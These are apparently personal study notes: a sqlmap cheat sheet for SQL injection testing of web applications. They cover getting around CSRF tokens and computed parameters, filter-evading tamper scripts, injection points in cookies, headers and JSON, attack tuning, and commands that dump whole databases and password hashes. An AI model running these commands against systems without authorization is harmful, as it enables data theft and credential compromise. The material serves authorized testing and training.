ANTI-CSRF TOKEN BYPASS
CSRF tokens are unique, secret, and unpredictable values generated by a server-side application; when a user acccesses a web app, the server generates the CSRF token and sends it to the client, embedding it into a web form or as a custom HTTP header; when the form is submitted or makes another request, the token is sent back to the server, which is checcked by the server; if missing, the server can reject the request, or even have detection mechanisms in place.

SQLMAP USING A SPECIFIC CSRF TOKEN:
--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"


UNIQUE VALUE BYPASS
(for the example value 'rp', this command will show what's generated:)
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
or as normal
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch


CALCULATED PARAMETER BYPASS (RUNNING CALCULATIONS USING --EVAL)
(for this example, the webapp expects parameter 'id' and the hash 'h', so we are using --eval to calculate the parameter 'h')
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

!!! === TAMPER SCRIPTS === !!!
Tamper scripts are python scripts that will modify requests just before sending them, which can sometimes bypass protections.

Some tamper scripts:
https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py
https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py
https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py

List of the 'best':
space2comment       - replace spaces with /*...*/ comments
randomcase          - randomize keyword casing
equaltolike         - replace = with LIKE-style constructs
apostrophemask      - mask/encode single quotes (')
charencode          - encode chars as CHAR()/hex

Other ones:
space2dash          - replace spaces with --/dash-style constructs
space2hash          - replace spaces with # comment (MySQL)
space2plus          - replace spaces with +
lowercase           - convert payload to lowercase
uppercase           - convert payload to uppercase
chardoubleencode    - double-encode characters
charunicode         - use unicode escapes for characters
hexencode           - represent strings as hex
hexencode_unicode   - hex + unicode encoding mix
comma2concat        - replace commas with DB-specific concatenation
between             - rewrite conditions using BETWEEN
greatest            - use GREATEST()/similar to obfuscate booleans
randomcomments      - inject random SQL comments into payloads
commentbeforeparentheses - insert comments before parentheses
append              - append benign tokens to payloads
prefix              - prepend benign tokens to payloads
percent             - apply percent/URL encoding tricks

USING TAMPER SCRIPTS:
--tamper=space2comment

CHAINING TAMPER SCRIPTS:
--tamper=space2comment,randomcase


BANGER CHAINS:

SETTING UP SQLMAP FOR A SQLi EVALUATION:
1. In the browser's DEVELOPER TOOLS, go to Network
2. Find the GET request for the page, the right-click, then Copy as cURL
3. type 'sqlmap' in terminal then paste.

USING A FULL HTTP REQUEST FOR SQLi EVAL W/ SQLMAP:
1. find the RAW request using a proxy application like Burp (FULL RAW REQUEST)
2. put full request into a file.
3. scan the file like: sqlmap -r request.txt



USE COOKIES LIKE:
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
or
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'


SPECIFY HTTP METHOD LIKE:
sqlmap -u www.target.com --data='id=1' --method PUT
(sometimes using an alternative method will expose a vulnerability)


SPECIFYING AN INJECTION MARK (LIKE IN INJECTABLE COOKIES) W/ '*'
Cookies:
sqlmap -u "http://target/" --cookie "session=*; other=val"

Headers:
sqlmap -u "http://target/" -H "X-Api-Key: *"

POST Form Data:
sqlmap -u "http://target/login" --data="username=admin&password=*"

GET query string:
sqlmap -u "http://83.136.255.159:57981/page?id=*"

JSON body (PUT/POST)
(Might need to utilize -r and mark the input on a full request for this one...)
sqlmap -u "http://target/api/user" --method=PUT \
  --data='{"id":1,"name":"*"}' -H "Content-Type: application/json"

 ===================
 == ATTACK TUNING ==
 ===================

 Usually SQLMap will run without using additional tuning, but in the case those attempts fail, then there are ways to tune the attack:

 PREFIX/SUFFIX (CUSTOM, since sqlmap already uses the common ones):
(prefix and suffix help to 'break' the code, allowing the injection to succeed)
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
(this is an example of many other prefix/suffix combos)


LEVEL/RISK:
Level:
--level (1 to 5)
(controls how THOROUGH/amount of tests performed)

Risk:
--risk (1 to 3)
(controls actions depending on effects on target (3 could potentially DoS))

OTHER ADVANCED TUNING METHODS:
STATUS CODES:
--code 200
(focus on 200 response codes)

FOCUS ON HTML <title>:
--titles

STRINGS (like success):
--string='bingo!'

REMOVING HTML TAGS:
--text-only


SPECIFYING TECHNIQUES:
--technique=BEU

== DATABASE ENUMERATION ==
==========================

When you find a successful spot with SQLMAP to inject and exploit, you can use the following commands in sqlmap to exfiltrate data:

Retrieve the banner:
--banner

Retrieve the current user:
--current-user

Retrieve current database name:
--current-db

Check if current user is database admin:
--is-dba

TABLE ENUMERATION

Fetching ALL information (and exluding the system db):
--exclude-sysdbs --dump-all

Fetching the complete overview of the database architecture:
--schema

Fetching all tables in a database:
--tables -D dbexample

Fetching all info in a table:
--dump -T table1
or if specifying db
--dump -T table1 -D dbexample

Fetching specific columns:
--dump -T table1 -D dbexample -C col1,col2,coletc

Fetching specific rows (selects range):
--dump -T table1 -D dbexample --start 5 --stop 10

Fetching rows with specific conditions using WHERE:
--dump -T table1 -D dbexample --where="<col> LIKE 'bingus%'"
(shows in that column names that start with bingus)

Searching for tables with 'user' string:
--search -T user

Searching for columns with 'pass' string:
--search -C pass

Dumping specifically passwords from database:
--passwords --batch
